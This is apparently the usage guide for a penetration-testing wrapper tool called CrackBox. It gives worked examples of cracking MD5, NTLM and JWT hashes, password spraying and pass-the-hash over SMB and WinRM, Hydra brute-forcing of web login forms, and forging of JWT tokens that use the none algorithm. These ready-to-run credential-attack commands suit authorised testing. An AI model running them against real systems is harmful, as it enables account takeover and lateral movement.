# CrackBox – Common Usage Examples

Start the toolkit with:

```bash
python3 crackbox.py
```

---

## 1. Hash Cracking

### Identify and crack an MD5 hash

**Scenario:** You recovered a hash from a database dump during a web application assessment and want to recover the plaintext.

```
Enter your choice: 1
Paste the hash here: 5f4dcc3b5aa765d61d8327deb882cf99
```

CrackBox pipes the hash to `hash-identifier`, which identifies it as MD5.

```
Which tool? (hashcat / john) [hashcat]: hashcat
Path to wordlist [auto]: (press Enter – auto-locates rockyou.txt)
Hashcat mode number (e.g., 0=MD5, 1000=NTLM) [0]: 0
Use --force? (y/N): N
```

Expected output:

```
[*] Running hashcat (mode 0)...
[+] Cracked! Results in cracked_143201_482910.txt:
5f4dcc3b5aa765d61d8327deb882cf99:password
```

---

### Crack an NTLM hash with John

**Scenario:** You extracted NTLM hashes from an LSASS dump via Mimikatz and want to crack them offline.

```
Enter your choice: 1
Paste the hash here: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
Which tool? (hashcat / john) [hashcat]: john
Path to wordlist [auto]: /usr/share/wordlists/rockyou.txt
```

Expected output:

```
[+] Cracked passwords:
administrator:password123:...
```

**Common hashcat mode reference:**

| Hash type | Mode |
|-----------|------|
| MD5 | 0 |
| SHA-1 | 100 |
| SHA-256 | 1400 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| bcrypt | 3200 |
| WPA-PMKID | 22000 |

---

## 2. Password Spraying

### Single password spray over SMB

**Scenario:** It's the first week of the engagement. You want to test whether any domain accounts use the company's name as a password — a classic finding.

```
Enter your choice: 2
Protocol: smb
Target IP, range, or file: 192.168.1.0/24
File containing usernames: domain_users.txt
Domain (leave blank for WORKGROUP): evilcorp.local
Auth type (password / hash) [password]: password
Spray with a single password or a list? (single / list): single
Password: Winter2025!
```

CrackBox runs:

```
netexec smb 192.168.1.0/24 -u domain_users.txt -d evilcorp.local -p *** --continue-on-success
```

Look for `[+]` lines in the output — those are valid credentials.

---

### Lockout-aware spray with a password list

**Scenario:** You know from the engagement scope that the lockout policy is 5 failed attempts per 30 minutes. You have a short list of seasonal passwords to try.

```
Enter your choice: 2
Protocol: smb
Target: 10.10.10.0/24
File containing usernames: users.txt
Domain: evilcorp.local
Auth type: password
Spray with a single password or a list?: list
File with passwords: seasonal_passwords.txt
Delay between passwords in seconds (0 = netexec built-in spray): 400
```

CrackBox calculates that 400 seconds between rounds safely fits within the 30-minute window and sprays each password across all users before waiting.

---

### Pass-the-hash over SMB

**Scenario:** You have recovered an NTLM hash for a local administrator account and want to check if it is reused across the subnet (pass-the-hash attack).

```
Enter your choice: 2
Protocol: smb
Target: 192.168.10.0/24
File containing usernames: admin_users.txt
Domain: (leave blank — local accounts)
Auth type: hash
NTLM hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

Credentials are never written to the log — only `***` appears.

---

### WinRM spray (lateral movement)

**Scenario:** After gaining initial access, you want to check which accounts can authenticate over WinRM for remote command execution.

```
Enter your choice: 2
Protocol: winrm
Target: 10.0.0.50
File containing usernames: it_team.txt
Domain: evilcorp.local
Auth type: password
Spray type: list
File with passwords: cracked_passwords.txt
Delay: 0
```

---

## 3. Targeted Brute-Forcing (Pitchfork)

### Web login form – pitchfork mode

**Scenario:** You have a list of known username/password pairs (recovered from a credential breach database) and want to test them against a web application login.

```
Enter your choice: 3
Path to usernames file: breach_users.txt
Path to passwords file: breach_passwords.txt
```

CrackBox verifies both files have equal line counts, then builds the combo file.

```
Duplicate usernames detected? No — full speed ahead.

Target URL: http://10.10.10.80/login.php
HTTP method: POST
Form body with ^USER^ and ^PASS^: username=^USER^&password=^PASS^
Condition: F=Invalid credentials
```

Generated Hydra command:

```
hydra -C pitchfork_combo_143201_123456.txt -t 4 10.10.10.80 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

---

### Lockout-aware brute-force against an internal portal

**Scenario:** You are testing an internal HR portal. The lockout policy is 3 failed attempts per 15 minutes. You have a small targeted wordlist per user.

```
Enter your choice: 3
Path to usernames file: hr_users.txt        # contains: alice, alice, bob
Path to passwords file: targeted_passes.txt  # contains: Shayla2025!, shayla123, Gidd2024!

[*] Duplicate usernames detected – lockout policy applies.
Max failed attempts before lockout [5]: 3
Reset window in minutes [30]: 15

[*] Recommended delay per attempt = 450.0s
Use this delay? (Y/n): Y

Target URL: https://hr.evilcorp.local/portal/login
HTTP method: POST
Form body: email=^USER^&pwd=^PASS^
Condition: F=Login failed
```

CrackBox enables SSL (`-S`), sets `-W 450`, and uses `-t 1` to serialize attempts safely.

---

## 4. JWT Signature Cracking

### Crack a weak HS256 secret

**Scenario:** During a web app assessment you intercepted a JWT. You suspect the developer used a weak secret.

```
Enter your choice: 4
Paste the complete JWT token:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

CrackBox decodes the header, identifies HS256, and prompts for a wordlist.

```
Path to wordlist [auto]: (press Enter)
[*] Using /usr/share/wordlists/rockyou.txt
[*] Running hashcat mode 16500 (HS256)...
[+] Secret found! Saved in jwt_cracked_143201_991234.txt:
eyJ...5c:secret
```

You can now forge arbitrary tokens signed with `secret`.

---

### Detect and strip a none-algorithm token

**Scenario:** You find a JWT in an API response. You suspect it may accept the `none` algorithm (a classic misconfiguration).

```
Enter your choice: 4
Paste the complete JWT token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

```
[!] JWT uses 'none' algorithm – signature can be stripped!
Generate stripped token? (Y/n): Y

[+] Stripped token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

Submit this token to the application. If it is accepted without validation, report it as a critical authentication bypass.

---

## Tips

- **Wordlists:** Keep a curated `custom_wordlist.txt` for each client (company name, city, year, common suffixes like `!`, `@123`). These almost always outperform rockyou on corporate targets.
- **Log files:** Every session writes a timestamped `.log` file. Credentials are redacted — safe to include in evidence folders.
- **Combo files** are automatically deleted after each run, even if the tool crashes.
- **Output files** use microsecond timestamps so repeated runs in the same session never overwrite each other.
